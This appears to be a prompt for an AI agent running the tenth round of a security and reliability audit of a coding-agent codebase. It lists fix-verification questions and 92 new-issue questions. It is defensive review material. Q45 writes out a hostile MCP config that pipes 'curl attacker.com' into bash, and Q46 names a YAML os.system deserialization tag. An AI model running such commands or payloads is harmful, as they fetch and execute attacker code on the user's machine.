# TENTH-ROUND COMPREHENSIVE MICRO-AUDIT

## Your Identity

You are a **Principal Security Engineer / Staff SRE**. Nine rounds of auditing have hardened this codebase. The last round (Round 9) fixed 5 issues:
1. **Issue #1**: Dynamic token adjustment — on 400 "context" error, shrinks `max_context_tokens` by 30% and aggressively prunes — `dev/agents/production_loop.py`
2. **Issue #2**: Orphaned tool results — `_truncate_to_fit` now removes tool_call/result pairs atomically — `dev/agents/production_loop.py`
3. **Issue #3**: Partial JSON on MAX_STEPS — detects unexecuted tool calls and returns `warning` field — `dev/agents/production_loop.py`
4. **Issue #4**: Duplicate messages on retry — `msg_checkpoint` before retry loop, rollback on failure — `dev/agents/production_loop.py`
5. **Issue #5**: Missing linter binary — `shutil.which()` check before execution in `lint_file`, `fix_file`, `format_file` — `dev/utils/quality.py`

This 10th round has TWO goals:
1. **Verify the 5 fixes from Round 9** — did they actually work? Any regressions?
2. **Find NEW issues** that all 9 previous rounds missed.

## RULES

1. Read EVERY file in the `dev/` directory. Do not skip any file.
2. For each issue, provide: exact file path, exact line number, severity, failure scenario, root cause, impact, and a code fix.
3. Do NOT report issues from previous rounds (1-9). Only NEW issues.
4. Do NOT report issues that were marked N/A or already correct in previous rounds.
5. Save your output as `review_10.md` in the project root.

---

## PART A: VERIFY ROUND 9 FIXES (15 Questions)

For each question, answer: **PASS** (fix is correct) or **FAIL** (fix has a gap), with explanation.

### Fix 1: Dynamic Token Adjustment (Questions 1-3)

**Q1.** Read `dev/agents/production_loop.py`. Verify that when a 400 "context" error occurs, `self.config.max_context_tokens` is reduced by 30%. Is the reduction applied to the correct attribute? Does it persist across subsequent steps?

**Q2.** After the 400 error, the code aggressively prunes `cur_messages` to the last 4 and `done_messages` to the last 2. Is this aggressive enough? What if the system prompt alone exceeds 70% of the reduced context window?

**Q3.** The `continue` statement after the 400 error retries the same step. But `msg_dicts` was computed BEFORE the retry. Does the retry use the OLD `msg_dicts` (stale) or recompute fresh `msg_dicts`? If stale, the retry will fail with the same 400 error.

### Fix 2: Orphaned Tool Results (Questions 4-5)

**Q4.** Read `_truncate_to_fit` in `dev/agents/production_loop.py`. The fix detects assistant messages with `tool_calls` and removes matching tool results. But what if the assistant message has `tool_calls` but NO corresponding tool results exist yet (e.g., the tool call was the last message and execution was interrupted)? Does the code handle this edge case?

**Q5.** The fix uses `tc.get("id", "")` to match tool results. What if the tool result has a different `tool_call_id` than the assistant's `tool_calls[].id`? Could a malformed API response cause a mismatch?

### Fix 3: Partial JSON on MAX_STEPS (Questions 6-7)

**Q6.** Read the MAX_STEPS handling in both `run()` and `run_streaming()`. The fix checks if the last message is an assistant with `tool_calls`. But what if the last message is a USER message (e.g., the LLM never responded)? Does the code handle this?

**Q7.** The `warning` field is returned in the result dict. But does the CLI (`main.py`) actually display this warning to the user? Or is it silently dropped?

### Fix 4: Checkpoint and Rollback (Questions 8-9)

**Q8.** Read the retry logic in `run_streaming()`. The `msg_checkpoint` is set to `len(self._state.cur_messages)` before the retry loop. On failure, it rolls back with `self._state.cur_messages = self._state.cur_messages[:msg_checkpoint]`. But what if `cur_messages` was modified DURING a successful partial stream (e.g., some text was yielded via `on_text`)? The rollback would lose those yielded tokens — but the user already saw them. Is this a consistency issue?

**Q9.** The `msg_checkpoint` is inside the `for step in range(max_steps)` loop, so it's recomputed each step. Is this correct? Or should it be set once before the step loop?

### Fix 5: Missing Linter Binary (Questions 10-12)

**Q10.** Read `dev/utils/quality.py`. Verify that `lint_file`, `fix_file`, and `format_file` all check `shutil.which()` before execution. Are all three methods covered?

**Q11.** The check uses `lint_cmd.split()[0]` to extract the binary name. What if the command is `"python -m ruff check {file}"`? The binary would be `python`, not `ruff`. Would `shutil.which('python')` return true even if `ruff` is not installed?

**Q12.** The `run_tests` method also runs shell commands (e.g., `pytest {test_path} -v`). Does it also check `shutil.which()` before execution? If not, is this a gap?

### Cross-Cutting Regression Checks (Questions 13-15)

**Q13.** After all Round 9 changes, do ALL 46 tests still pass? Are there any new test failures?

**Q14.** Does the `_count_tokens` heuristic still work correctly after the 400 error recovery? After shrinking `max_context_tokens` by 30%, does the pruner now trigger more aggressively?

**Q15.** The `_prune_if_needed` method checks `tokens <= threshold` where `threshold = max_context_tokens * 0.8`. After a 400 error shrinks the limit, does this threshold shrink proportionally? Or does the agent now prune too aggressively?

---

## PART B: NEW ISSUE DISCOVERY (50 Questions)

Now read EVERY file in `dev/` and answer these questions. For each issue found, provide the full issue format.

### Core Agent Loop (Q16-Q25)

**Q16.** Read `dev/agents/production_loop.py`. The `_auto_compact_if_needed` method summarizes old messages. But the summary is injected as a `role="user"` message. Does the LLM correctly interpret this as a summary, or does it treat it as a new user instruction?

**Q17.** The production loop has `reflection_count` to detect loops. What happens if the LLM alternates between two different non-tool-call responses (A, B, A, B)? The reflection detector won't catch this because `last_error` changes each time.

**Q18.** The `_build_system_prompt` method loads `DEV.md`, `.devrules`, and `.dev/` directory. What happens if multiple rule sources conflict (e.g., `DEV.md` says "use tabs" and `.devrules/style.md` says "use spaces")? Is there a precedence?

**Q19.** The `_resolve_imports` method recursively resolves `@import` directives. What happens if an imported file is 10MB? Is there a size limit?

**Q20.** The `_load_auto_memory` method loads from `.dev/memory/auto_memory.md`. What happens if this file is deleted while the agent is running? Is the error caught?

**Q21.** The `_format_messages` method prepends the system prompt. What happens if the system prompt is empty? Does the LLM receive an empty system message, or is it omitted?

**Q22.** The `_messages_to_dicts` method converts Message objects to dicts. What happens if a Message has both `content` and `tool_calls`? Does the API accept this?

**Q23.** The production loop tracks `total_cost` and `total_tokens_sent/received`. But the NIM API is free. Is this tracking accurate, or is it based on estimates?

**Q24.** The `_show_git_diff` method runs `git diff --stat`. What happens if the git repository is in a rebasing state? Does `git diff` work correctly?

**Q25.** The `_backup_file` method creates checkpoints in `.dev/checkpoints/`. What happens if the `.dev/` directory is in `.gitignore`? Does the backup still work?

### NIM Provider (Q26-Q34)

**Q26.** Read `dev/providers/nim_provider.py`. The `_wait_for_available_key` method sleeps until a key is available. What happens if ALL keys are exhausted and the cooldown is 60 seconds? Does the agent wait 60 seconds, or does it fail immediately?

**Q27.** The streaming parser in `_stream_with_tools` accumulates tool call deltas. What happens if a delta contains a malformed JSON fragment (e.g., `"arguments": "{\\"incomplete"`)? Is the partial JSON handled?

**Q28.** The provider has a `close()` method. Is it called in a `finally` block in the production loop? Or does the client leak on exceptions?

**Q29.** What happens when the NIM API returns a 500 error? Is it retried, or does it fail immediately?

**Q30.** The provider tracks `tokens_per_minute`. What happens when a single request uses more tokens than the remaining TPM budget? Does it wait or fail?

**Q31.** The `chat_completion_stream_events` method falls back to non-streaming when tool streaming fails. But the non-streaming response includes the full content at once. Is this a UX issue (no token-by-token streaming)?

**Q32.** The provider uses `httpx.AsyncClient` with `Limits(max_connections=100)`. Is the client reused across requests? Or is a new client created each time?

**Q33.** The `_record_usage` method tracks token usage. What happens if the NIM API returns usage data in a different format (e.g., missing `prompt_tokens`)? Is there a fallback?

**Q34.** The provider has a `_log` method. Is it implemented? Or is it a no-op?

### Tools (Q35-Q44)

**Q35.** Read `dev/tools/real_tools.py`. The `run_terminal_command` tool uses `asyncio.create_subprocess_shell`. What happens if the command contains `&&` or `||` chains? Are they executed correctly?

**Q36.** The `read_files` tool reads multiple files. What happens if one file is a symlink to `/etc/passwd`? Is symlink resolution blocked?

**Q37.** The `write_file` tool uses atomic writes. The temp file is created next to the target. What happens if the parent directory is read-only? Is the error caught?

**Q38.** The `str_replace` tool normalizes `\r\n` to `\n`. What happens if the file contains mixed line endings (some `\r\n`, some `\n`)? Does the replacement preserve the original style?

**Q39.** The `code_search` tool uses ripgrep. What happens if ripgrep is not installed? Is there a fallback?

**Q40.** The `glob` tool searches for files. What happens if the glob pattern matches 10,000+ files? Is the result capped?

**Q41.** The `list_directory` tool lists files. What happens if the directory contains a symlink loop? Does `os.listdir` hang?

**Q42.** The `web_search` tool calls an external API. What happens if the API returns HTML instead of JSON? Is the error caught?

**Q43.** The `read_url` tool fetches URLs. What happens if the URL returns a 302 redirect to a `file://` or `ftp://` scheme? Is this blocked?

**Q44.** The `git_operations` tool runs git commands. What happens if git is not installed? Is the error caught?

### Security (Q45-Q54)

**Q45.** Read `dev/mcp/client.py`. The MCP client launches subprocesses. What happens if the `mcp.json` config specifies `{"command": "bash", "args": ["-c", "curl attacker.com | bash"]}`? Is this blocked?

**Q46.** The `.devrules` loader reads YAML. What happens if the YAML contains a `!!python/object/apply:os.system` tag? Is this blocked?

**Q47.** The `auto_commit` method runs `git add` and `git commit`. What happens if the `.git/hooks/pre-commit` script contains malicious code? Is it executed?

**Q48.** The `repo_map` tool walks the filesystem. What happens if it encounters a device file like `/dev/zero` or a named pipe? Does `os.walk` hang?

**Q49.** The ANSI sanitization in `main.py` strips escape sequences. What about Unicode homoglyphs (e.g., Cyrillic 'а' instead of Latin 'a')? Could a malicious terminal output confuse the user?

**Q50.** The `history.py` saves conversations with `0o600` permissions. What happens if the `~/.dev/conversations/` directory doesn't exist? Is it created with safe permissions?

**Q51.** The `auto_commit` method only adds edited files. What happens if an edited file is a symlink to a file outside the project? Does `git add` follow the symlink?

**Q52.** The `context_pruner` removes old messages. What happens if it removes a tool call but keeps its result? Does the API reject this?

**Q53.** The `sandbox_manager.py` allowlist includes `PATH`. Could an attacker prepend `/malicious/dir` to `PATH` before starting the agent, causing sandboxed commands to run attacker binaries?

**Q54.** The `quality.py` linter runs shell commands. What happens if the linter itself is a malicious binary named `ruff` placed in the project directory? Does the agent run it?

### Performance & Reliability (Q55-Q64)

**Q55.** The agent stores conversation history in RAM. What happens after 24 hours of continuous use? How much memory does `cur_messages` consume?

**Q56.** The `_cleanup_old_checkpoints` method caps checkpoints at 100. What is the average checkpoint size? For a large project, could 100 checkpoints consume 1GB+ of disk?

**Q57.** The `NimProvider` maintains an `httpx.AsyncClient` with `Limits(max_connections=100)`. Could it exhaust file descriptors?

**Q58.** The `run_terminal_command` tool captures stdout/stderr. What happens if the command produces 1GB of output? Is it truncated before being loaded into memory?

**Q59.** The `code_search` tool runs ripgrep. What happens if the project has 100,000+ files? Does ripgrep complete within the timeout?

**Q60.** The `web_search` tool calls an external API. What happens if the API is down? Is there a circuit breaker?

**Q61.** The `read_url` tool fetches URLs. What happens if the URL returns a 100MB HTML page? Is it truncated?

**Q62.** The `auto_memory` system stores rules. What happens after 1000 rules? Does the system prompt exceed the context limit?

**Q63.** The `MCPClient` manages multiple servers. What happens if one server crashes? Do the others continue working?

**Q64.** The `QualityChecker` runs linters sequentially. What happens if a project has 50 files to lint? Does it run all 50 in parallel or sequentially?

### Cross-Platform (Q65-Q74)

**Q65.** The `_find_bash` helper in `real_tools.py` searches for bash. What happens on Windows if Git Bash is not installed? Does the agent fall back to `cmd.exe`?

**Q66.** The Windows MAX_PATH fix adds `\\?\` prefix. Does this work with all Python file operations? What about `os.path.join` with the prefix?

**Q67.** The `sandbox_manager.py` uses `os.killpg` on UNIX. What about macOS? Does `start_new_session=True` work the same way?

**Q68.** The `auto_commit` method uses `git`. What happens if git is not installed? Is the error caught?

**Q69.** The `repo_map` tool uses `os.walk`. What about Windows junction points or macOS aliases? Does `os.walk` follow them?

**Q70.** The `run_terminal_command` tool sets `creationflags` on Windows. What about `subprocess.CREATE_NO_WINDOW`? Is it set?

**Q71.** The `quality.py` linter assumes `ruff` is in PATH. What if the user has it installed in a virtualenv? Does the agent find it?

**Q72.** The `history.py` saves to `~/.dev/conversations/`. On Windows, `~` resolves to `C:\Users\<user>`. Is this correct?

**Q73.** The `sandbox_manager.py` creates temp directories. On Windows, `/tmp/dev-sandbox` doesn't exist. Is the temp dir created correctly?

**Q74.** The `NimProvider` uses `httpx.AsyncClient`. Does it work on Windows with the default event loop policy?

### Architecture & Code Quality (Q75-Q84)

**Q75.** Read the `__init__.py` files. Are there any circular imports?

**Q76.** Read the test files. Is test coverage above 80%? Which modules have zero test coverage?

**Q77.** Read the `dev/sandbox/` directory. Is the sandbox actually used by the production loop? Or is it dead code?

**Q78.** Read the `dev/mcp/` directory. Is the MCP client integrated into the agent loop? Or is it standalone?

**Q79.** Read the `dev/agents/production_loop.py`. How many lines is it? Should it be split into smaller modules?

**Q80.** Read the `dev/tools/real_tools.py`. How many tools are registered? Are there any tools that duplicate functionality?

**Q81.** Read the `dev/providers/nim_provider.py`. Is the provider class testable? Or is it tightly coupled to httpx?

**Q82.** Read the `dev/utils/` directory. Are there any utility functions that are never called?

**Q83.** Read the `dev/cli/main.py`. How many CLI commands are registered? Are there any commands that overlap?

**Q84.** Read the `pyproject.toml`. Are there any unused dependencies?

### Edge Cases & Regression (Q85-Q92)

**Q85.** What happens if the user runs the agent in a directory with no write permissions?

**Q86.** What happens if the NIM API key is empty or invalid?

**Q87.** What happens if the user types a 10,000-character prompt?

**Q88.** What happens if two agent instances run in the same directory simultaneously?

**Q89.** What happens if the `.dev/checkpoints/` directory is deleted while the agent is running?

**Q90.** What happens if the `mcp.json` file is deleted while MCP servers are running?

**Q91.** What happens if the user's disk is full when the agent tries to save a checkpoint?

**Q92.** What happens if the agent is run as root?

---

## OUTPUT FORMAT

Save your output as `review_10.md` in the project root with this structure:

```markdown
# TENTH-PASS MICRO-AUDIT REPORT

**Auditor**: Principal Security Engineer
**Target**: Dev Agent Codebase
**Goal**: Verify Round 9 fixes + find NEW issues

## FIX VERIFICATION (Part A)

| Question | Verdict | Explanation |
|----------|---------|-------------|
| Q1 | PASS/FAIL | ... |
...

## NEW ISSUES FOUND (Part B)

### ISSUE #1
**File:** ...
**Line:** ...
**Severity:** Critical/High/Medium/Low
**Domain:** ...
**Title:** ...
**Failure Scenario:** ...
**Root Cause:** ...
**Impact:** ...
**Fix:** ...

(continue for each issue)

## SUMMARY

| Metric | Value |
|--------|-------|
| Fixes verified (PASS) | X/15 |
| Fixes failed (FAIL) | X/15 |
| New issues found | X |
| Critical | X |
| High | X |
| Medium | X |
| Low | X |

## FINAL ASSESSMENT

(1-2 paragraphs on overall codebase health)
```

---

## CRITICAL REMINDERS

1. **Read EVERY file.** Do not skip files based on assumptions.
2. **Verify the 5 Round 9 fixes first.** This is the primary goal of this round.
3. **Find NEW issues only.** Do not re-report issues from rounds 1-9.
4. **Be specific.** Every issue must have exact file path, line number, and code fix.
5. **Think like an attacker.** How would you exploit this agent?
6. **Think like an SRE.** What breaks at 3 AM on a Sunday?
7. **Think like a user.** What frustrates the developer using this tool?
8. **Save as `review_10.md`.** Include the summary table and final assessment.
